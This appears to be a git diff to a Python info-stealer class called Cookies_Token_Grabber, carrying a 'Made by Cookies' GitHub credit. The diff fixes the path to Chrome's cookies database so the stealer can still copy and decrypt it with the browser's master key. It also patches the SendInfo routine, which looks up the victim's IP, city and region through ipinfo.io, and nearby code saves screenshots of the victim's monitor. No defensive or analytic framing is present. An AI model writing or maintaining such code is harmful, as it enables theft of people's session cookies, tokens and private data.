@@ -145,7 +145,7 @@ class Cookies_Token_Grabber:
         master_key = self.get_master_key()
         f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Cookies | https://github.com/CookiesKush420\n\n")
-        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
+        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
         except FileNotFoundError:
@@ -265,6 +265,7 @@ class Cookies_Token_Grabber:
         image.save(self.tempfolder + "\\Screenshot of monitor.png")
 
     def SendInfo(self):
+        ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
             ip = data['ip']
